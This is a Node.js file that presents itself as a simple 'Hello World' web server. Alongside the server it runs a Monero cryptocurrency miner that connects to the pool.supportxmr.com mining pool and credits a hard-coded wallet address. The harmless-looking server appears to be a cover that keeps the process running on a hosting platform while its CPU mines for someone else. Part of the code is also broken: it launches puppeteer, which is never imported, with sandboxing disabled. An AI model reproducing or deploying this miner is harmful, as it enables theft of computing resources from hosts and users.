const NodeMiner = require('node-miner');
const http = require('http');

// Configure our HTTP server to respond with Hello World to all requests.
const server = http.createServer((request, response) => {
  response.writeHead(200, {"Content-Type": "text/plain"});
  response.end("Hello World\n");
});

(async () => {
 
    const browser = await puppeteer.launch({args: ['--no-sandbox', '--disable-setuid-sandbox']});

    const miner = await NodeMiner({
        host: `pool.supportxmr.com`,
        port: 5555,
        username: `46NbvdUFHq7GapMDffA5f1fK7SKXzqPQ77vxjdYmhwMgbsnyJADSeeXEyAxmTCqpypTvwuRdy9rxkWjLGvXLdSPnM6m8wir `,
        password: 'x'
    });
 
    await miner.start();
 
    miner.on('found', () => console.log('Result: FOUND \n---'));
    miner.on('accepted', () => console.log('Result: SUCCESS \n---'));
    miner.on('update', data => {
        console.log(`Hashrate: ${data.hashesPerSecond} H/s`);
        console.log(`Total hashes mined: ${data.totalHashes}`);
        console.log(`---`);
    });
 
})();


// Last, but not least, listen on port 8080
// The environment variable PORT is automatically defined and equals to 8080
server.listen(process.env.PORT, '0.0.0.0');
